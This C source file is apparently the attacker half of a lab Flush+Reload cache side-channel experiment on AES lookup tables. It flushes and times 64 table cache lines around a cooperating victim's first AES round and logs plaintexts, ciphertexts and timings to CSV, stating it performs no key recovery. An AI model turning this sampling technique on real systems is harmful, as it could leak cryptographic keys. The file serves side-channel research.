#define _GNU_SOURCE

#include "shared.h"
#include "timing.h"

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

static const uint8_t probe_order[TOTAL_MONITORED_LINES] = {
    17, 3, 49, 28, 8, 61, 36, 12,
    44, 23, 1, 55, 31, 6, 40, 14,
    52, 21, 9, 58, 34, 0, 47, 26,
    11, 63, 38, 19, 5, 50, 30, 42,
    15, 57, 24, 2, 46, 33, 10, 60,
    27, 7, 53, 37, 18, 45, 29, 13,
    62, 39, 20, 4, 51, 35, 16, 59,
    25, 48, 32, 56, 22, 41, 54, 43
};

static int bind_process_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        fprintf(stderr, "attacker: sched_setaffinity(cpu=%d): %s\n", cpu, strerror(errno));
        return -1;
    }
    return 0;
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "Usage: %s --table PATH --ctrl NAME --traces N --cpu CPU --csv RAW [--sync-csv PATH]\n",
            prog);
}

static int wait_phase(shared_control_t *ctrl, int wanted)
{
    for (;;) {
        const int fatal = atomic_load_explicit(&ctrl->fatal_error, memory_order_acquire);
        const int phase = atomic_load_explicit(&ctrl->phase, memory_order_acquire);
        if (fatal != 0 || phase == PHASE_ERROR) return -1;
        if (phase == wanted) return 0;
        __asm__ volatile("nop\n\t" ::: "memory");
    }
}

static inline void *table_line_address(uint32_t *tables, int flat_line)
{
    const int table_id = flat_line / LINES_PER_TABLE;
    const int line_id = flat_line % LINES_PER_TABLE;
    const int entry = line_id * ENTRIES_PER_CACHE_LINE;
    return (void *)&tables[table_id * TABLE_ENTRIES + entry];
}

static void flush_all_table_lines(uint32_t *tables)
{
    for (int i = 0; i < TOTAL_MONITORED_LINES; ++i) {
        CLFLUSH_LINE(table_line_address(tables, probe_order[i]));
    }
    MFENCE_ALL();
}

static void reload_all_table_lines(uint32_t *tables, uint32_t timings[4][16])
{
    for (int i = 0; i < TOTAL_MONITORED_LINES; ++i) {
        const int flat = probe_order[i];
        const int table_id = flat / LINES_PER_TABLE;
        const int line_id = flat % LINES_PER_TABLE;
        uint32_t elapsed;
        PROBE_RELOAD_ONLY(table_line_address(tables, flat), elapsed);
        timings[table_id][line_id] = elapsed;
    }
}

static uint32_t xorshift32(uint32_t *state)
{
    uint32_t x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

static void make_known_plaintext(uint32_t *rng, uint8_t pt[16])
{
    for (int i = 0; i < 16; ++i) pt[i] = (uint8_t)xorshift32(rng);
}

static void write_hex_bytes(FILE *fp, const uint8_t *bytes, size_t count)
{
    for (size_t i = 0; i < count; ++i) fprintf(fp, ",%02x", bytes[i]);
}

static int write_raw_header(FILE *fp)
{
    if (fprintf(fp, "trace") < 0) return -1;
    for (int i = 0; i < 16; ++i) if (fprintf(fp, ",pt%02d", i) < 0) return -1;
    for (int i = 0; i < 16; ++i) if (fprintf(fp, ",ct%02d", i) < 0) return -1;
    for (int table_id = 0; table_id < TABLE_COUNT; ++table_id) {
        for (int line_id = 0; line_id < LINES_PER_TABLE; ++line_id) {
            if (fprintf(fp, ",te%d_line%02d_ticks", table_id, line_id) < 0) return -1;
        }
    }
    return fprintf(fp, "\n") < 0 ? -1 : 0;
}

static int write_raw_row(FILE *fp, int trace_id, const uint8_t pt[16],
                         const uint8_t ct[16], uint32_t timings[4][16])
{
    if (fprintf(fp, "%d", trace_id) < 0) return -1;
    write_hex_bytes(fp, pt, 16);
    write_hex_bytes(fp, ct, 16);
    for (int t = 0; t < TABLE_COUNT; ++t)
        for (int line = 0; line < LINES_PER_TABLE; ++line)
            if (fprintf(fp, ",%" PRIu32, timings[t][line]) < 0) return -1;
    return fprintf(fp, "\n") < 0 ? -1 : 0;
}

static int write_sync_header(FILE *fp)
{
    return fprintf(fp,
        "trace,round_start_tsc,round_done_tsc,rest_start_tsc,trace_done_tsc,"
        "first_round_cycles,attacker_measurement_window_cycles,"
        "rest_aes_cycles,trace_wall_cycles\n") < 0 ? -1 : 0;
}

static int write_sync_row(FILE *fp, int trace_id, const shared_control_t *ctrl)
{
    const uint64_t first = ctrl->victim_round_done_tsc - ctrl->victim_round_start_tsc;
    const uint64_t measure = ctrl->victim_rest_start_tsc - ctrl->victim_round_done_tsc;
    const uint64_t rest = ctrl->victim_trace_done_tsc - ctrl->victim_rest_start_tsc;
    const uint64_t wall = ctrl->victim_trace_done_tsc - ctrl->victim_round_start_tsc;
    return fprintf(fp, "%d,%" PRIu64 ",%" PRIu64 ",%" PRIu64 ",%" PRIu64 ","
                      "%" PRIu64 ",%" PRIu64 ",%" PRIu64 ",%" PRIu64 "\n",
                   trace_id, ctrl->victim_round_start_tsc,
                   ctrl->victim_round_done_tsc, ctrl->victim_rest_start_tsc,
                   ctrl->victim_trace_done_tsc, first, measure, rest, wall) < 0 ? -1 : 0;
}

int main(int argc, char **argv)
{
    const char *table_path = DEFAULT_TABLE_FILE;
    const char *ctrl_name = DEFAULT_CTRL_NAME;
    const char *raw_path = DEFAULT_RAW_CSV;
    const char *sync_path = DEFAULT_SYNC_CSV;
    int trace_count = DEFAULT_TRACE_COUNT;
    int cpu = DEFAULT_ATTACKER_CPU;
    uint32_t seed = 0x12345678U;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--table") == 0 && i + 1 < argc) table_path = argv[++i];
        else if (strcmp(argv[i], "--ctrl") == 0 && i + 1 < argc) ctrl_name = argv[++i];
        else if (strcmp(argv[i], "--traces") == 0 && i + 1 < argc) trace_count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--cpu") == 0 && i + 1 < argc) cpu = atoi(argv[++i]);
        else if (strcmp(argv[i], "--csv") == 0 && i + 1 < argc) raw_path = argv[++i];
        else if (strcmp(argv[i], "--sync-csv") == 0 && i + 1 < argc) sync_path = argv[++i];
        else if (strcmp(argv[i], "--seed") == 0 && i + 1 < argc) seed = (uint32_t)strtoul(argv[++i], NULL, 0);
        else { usage(argv[0]); return 2; }
    }

    if (trace_count <= 0 || trace_count > 1000000 || cpu < 0) {
        fprintf(stderr, "attacker: invalid traces/cpu\n");
        return 2;
    }
    if (bind_process_to_cpu(cpu) != 0) return 1;

    int shm_fd = shm_open(ctrl_name, O_RDWR, 0600);
    if (shm_fd < 0) {
        fprintf(stderr, "attacker: shm_open %s: %s; start victim first\n", ctrl_name, strerror(errno));
        return 1;
    }
    shared_control_t *ctrl = mmap(NULL, sizeof(*ctrl), PROT_READ | PROT_WRITE,
                                   MAP_SHARED, shm_fd, 0);
    close(shm_fd);
    if (ctrl == MAP_FAILED) {
        fprintf(stderr, "attacker: mmap control: %s\n", strerror(errno));
        return 1;
    }

    if (ctrl->magic != CTRL_MAGIC || ctrl->trace_count != (uint32_t)trace_count) {
        fprintf(stderr, "attacker: control metadata mismatch\n");
        munmap(ctrl, sizeof(*ctrl));
        return 1;
    }
    while (atomic_load_explicit(&ctrl->table_ready, memory_order_acquire) == 0) {
        if (atomic_load_explicit(&ctrl->fatal_error, memory_order_acquire) != 0) {
            munmap(ctrl, sizeof(*ctrl));
            return 1;
        }
        __asm__ volatile("nop\n\t" ::: "memory");
    }

    int table_fd = open(table_path, O_RDONLY);
    if (table_fd < 0) {
        fprintf(stderr, "attacker: open table %s: %s\n", table_path, strerror(errno));
        munmap(ctrl, sizeof(*ctrl));
        return 1;
    }
    uint32_t *tables = mmap(NULL, TABLE_FILE_BYTES, PROT_READ, MAP_SHARED, table_fd, 0);
    close(table_fd);
    if (tables == MAP_FAILED) {
        fprintf(stderr, "attacker: mmap table: %s\n", strerror(errno));
        munmap(ctrl, sizeof(*ctrl));
        return 1;
    }

    FILE *raw_fp = fopen(raw_path, "w");
    FILE *sync_fp = fopen(sync_path, "w");
    if (raw_fp == NULL || sync_fp == NULL) {
        fprintf(stderr, "attacker: cannot open output CSV: %s\n", strerror(errno));
        if (raw_fp != NULL) fclose(raw_fp);
        if (sync_fp != NULL) fclose(sync_fp);
        munmap(tables, TABLE_FILE_BYTES);
        munmap(ctrl, sizeof(*ctrl));
        return 1;
    }
    if (write_raw_header(raw_fp) != 0 || write_sync_header(sync_fp) != 0) {
        fprintf(stderr, "attacker: failed to write CSV header\n");
        fclose(raw_fp); fclose(sync_fp);
        munmap(tables, TABLE_FILE_BYTES);
        munmap(ctrl, sizeof(*ctrl));
        return 1;
    }

    printf("attacker ready: cpu=%d, traces=%d, raw=%s, sync=%s\n",
           cpu, trace_count, raw_path, sync_path);
    printf("runtime mode: raw collection only; no threshold, hit/miss, or key recovery is executed.\n");
    fflush(stdout);

    uint32_t rng = seed;
    int failed = 0;
    for (int trace_id = 0; trace_id < trace_count; ++trace_id) {
        if (wait_phase(ctrl, PHASE_READY) != 0) { failed = 1; break; }

        uint8_t plaintext[16];
        uint32_t timings[4][16];
        make_known_plaintext(&rng, plaintext);
        memcpy(ctrl->current_plaintext, plaintext, sizeof(plaintext));
        atomic_thread_fence(memory_order_release);

        flush_all_table_lines(tables);
        busy_wait_nops(50);
        atomic_store_explicit(&ctrl->phase, PHASE_START, memory_order_release);

        if (wait_phase(ctrl, PHASE_ROUND_DONE) != 0) { failed = 1; break; }

        /* 这里只做原始时间采集，不根据 ticks 做任何判断。 */
        reload_all_table_lines(tables, timings);

        atomic_store_explicit(&ctrl->phase, PHASE_MEASURE_DONE, memory_order_release);
        const int end_phase = (trace_id + 1 == trace_count) ? PHASE_DONE : PHASE_READY;
        while (atomic_load_explicit(&ctrl->phase, memory_order_acquire) != end_phase) {
            if (atomic_load_explicit(&ctrl->fatal_error, memory_order_acquire) != 0) {
                failed = 1; break;
            }
            __asm__ volatile("nop\n\t" ::: "memory");
        }
        if (failed) break;

        atomic_thread_fence(memory_order_acquire);
        if (write_raw_row(raw_fp, trace_id, plaintext,
                          ctrl->current_ciphertext, timings) != 0 ||
            write_sync_row(sync_fp, trace_id, ctrl) != 0) {
            fprintf(stderr, "attacker: failed to write CSV row %d\n", trace_id);
            failed = 1;
            break;
        }
        fflush(raw_fp);
        fflush(sync_fp);
    }

    fclose(raw_fp);
    fclose(sync_fp);
    munmap(tables, TABLE_FILE_BYTES);
    munmap(ctrl, sizeof(*ctrl));
    return failed ? 1 : 0;
}
